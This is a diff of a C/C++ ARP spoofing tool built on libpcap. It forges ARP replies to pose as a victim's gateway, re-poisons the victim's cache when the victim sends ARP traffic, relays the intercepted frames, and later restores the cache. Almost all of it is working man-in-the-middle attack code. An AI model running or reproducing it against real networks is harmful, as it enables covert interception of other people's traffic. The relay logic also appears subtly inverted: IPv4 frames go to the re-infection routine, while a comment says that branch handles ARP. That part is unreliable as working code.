@@ -1,4 +1,3 @@
-
 #include <stdio.h>
 #include <stdint.h>
 #include "hdr.h"
@@ -44,7 +43,6 @@ uint32_t get_my_ip(char *dev){
     return get_ip(ipstr);
 }
 
-
 void get_attacker_mac(char* dev, uint8_t *mac){
 
     struct ifreq ifr;
@@ -77,7 +75,6 @@ void send_request(pcap_t* handle, uint8_t *target_mac, uint32_t target_ip, uint8
     memset(arp_request.arp.src_mac, 0xFF, 6);
     arp_request.arp.tag_ip = htonl(target_ip);
 
-
     while(true){
         struct pcap_pkthdr* header;
         const u_char* data;
@@ -91,6 +88,7 @@ void send_request(pcap_t* handle, uint8_t *target_mac, uint32_t target_ip, uint8
         if(res == -1 || res == -2){
             printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
         }
+
         ARP_Packet *capture = (ARP_Packet*)data;
         if(ntohs(capture->eth.pkt_type) == 0x0806){
             if(ntohs(capture->arp.opcode) == 0x0002){
@@ -113,7 +111,7 @@ void send_arp_reply(pcap_t* handle, uint8_t victim_mac[],uint8_t attacker_mac[],
     arp_reply.arp.prc_type = htons(0x0800);
     arp_reply.arp.hd_addr_len = 0x06;
     arp_reply.arp.prc_addr_len = 0x04;
-    arp_reply.arp.opcode = htons(0x0001);
+    arp_reply.arp.opcode = htons(0x0002);
 
     memcpy(arp_reply.arp.src_mac,attacker_mac,sizeof(uint8_t)*6);
     arp_reply.arp.src_ip = htonl(gateway_ip);
@@ -125,37 +123,29 @@ void send_arp_reply(pcap_t* handle, uint8_t victim_mac[],uint8_t attacker_mac[],
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 }
-//void re_infect(Ether * eth, pcap_t* handle, const char* data,uint8_t *victim_mac, uint8_t *attacker_mac, uint32_t gateway_ip, uint32_t victim_ip){
 
-//    ARP_Packet* arp = (ARP_Packet*)data;
-//    if(ntohl(arp->arp.tag_ip) == gateway_ip){
-//        if(ntohs(arp->arp.opcode) == 0x0001){   //victim send to gateway are you victim?
-//            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
-//            printf("Send ARP reply Packet\n");
-//        }
-//        else{   //victim send reply packet
-//            if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-//                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
-//                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
-//                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-//                if (res2 != 0) {
-//                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
-//                }
-//            }
-//        }
-//    }
-//    else{   // victim send to me ARP are you?
-//        if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-//            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
-//            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
-//            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-//            if (res2 != 0) {
-//                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
-//            }
-//        }
-//    }
-//}
+void re_infect(Ether * eth, pcap_t* handle, pcap_pkthdr *header, const u_char* data, uint8_t *victim_mac, uint8_t *attacker_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
 
+    ARP_Packet* arp = (ARP_Packet*)data;
+    if(ntohl(arp->arp.tag_ip) == gateway_ip){
+        if(ntohs(arp->arp.opcode) == 0x0001){   //victim send request packet to gateway ?
+            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
+            printf("Send ARP reply Packet\n");
+        }
+        else{   //victim send reply packet to gateway
+            if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
+                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
+                memcpy(arp->arp.src_mac, attacker_mac, sizeof(uint8_t)*6);
+                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
+                memcpy(arp->arp.tag_mac, gateway_mac, sizeof(uint8_t)*6);
+                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
+                if (res2 != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+                }
+            }
+        }
+    }
+}
 
 void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
 
@@ -171,13 +161,41 @@ void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, ui
         Ether* eth = (Ether *)data;
 
         if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
-            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
-            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-            if (res2 != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+            if(ntohs(eth->pkt_type) != 0x0800){
+                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
+                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
+                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
+                if (res2 != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+                }
+            }
+            else{ // victim send arp (reqeust or reply)
+                re_infect(eth, handle,header, data, victim_mac, attacker_mac, gateway_mac, gateway_ip, victim_ip);
             }
         }
+    }
+}
+
+void arp_recover(pcap_t* handle, uint8_t* victim_mac, uint8_t* attacker_mac, uint8_t* gateway_mac, uint32_t gateway_ip,uint32_t victim_ip){
+    ARP_Packet arp_reply;
+    memcpy(arp_reply.eth.des,victim_mac,sizeof(uint8_t)*6);
+    memcpy(arp_reply.eth.src,gateway_mac,sizeof(uint8_t)*6);
+    arp_reply.eth.pkt_type = htons(0x0806);
+
+    arp_reply.arp.hd_type = htons(0x0001);
+    arp_reply.arp.prc_type = htons(0x0800);
+    arp_reply.arp.hd_addr_len = 0x06;
+    arp_reply.arp.prc_addr_len = 0x04;
+    arp_reply.arp.opcode = htons(0x0002);
+
+    memcpy(arp_reply.arp.src_mac,gateway_mac,sizeof(uint8_t)*6);
+    arp_reply.arp.src_ip = htonl(gateway_ip);
+    memcpy(arp_reply.arp.tag_mac,victim_mac,sizeof(uint8_t)*6);
+    arp_reply.arp.tag_ip = htonl(victim_ip);
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_reply), sizeof(ARP_Packet));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 }
 
@@ -196,6 +214,7 @@ int main(int argc, char* argv[]){
 
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
+
     victim_ip = get_ip(argv[2]);
     printf("Get victim IP : %d.%d.%d.%d\n",ntohl(victim_ip) & 0xFF, ntohl(victim_ip <<8)&0xFF,ntohl(victim_ip <<16)&0xFF,ntohl(victim_ip <<24)&0xFF);
     gateway_ip = get_ip(argv[3]);
@@ -203,13 +222,11 @@ int main(int argc, char* argv[]){
     attacker_ip = get_my_ip(dev);
     printf("Get device IP : %d.%d.%d.%d\n",ntohl(attacker_ip)&0xFF,ntohl(attacker_ip<<8)&0xFF,ntohl(attacker_ip<<16)&0xFF,ntohl(attacker_ip<<24)&0xFF);
 
-
     pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
     if(handle == nullptr){
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
-    printf("Open handle\n");
 
     get_attacker_mac(dev,attacker_mac);
     printf("Get attacker MAC : %02x:%02x:%02x:%02x:%02x:%02x \n",attacker_mac[0], attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);
@@ -221,6 +238,7 @@ int main(int argc, char* argv[]){
     send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
 
     packet_relay(handle,attacker_mac,victim_mac,gateway_mac,gateway_ip,victim_ip);
+    arp_recover(handle,victim_mac,attacker_mac,gateway_mac,gateway_ip,victim_ip);
 
-    pcap_close(handle);
+    return 0;
 }
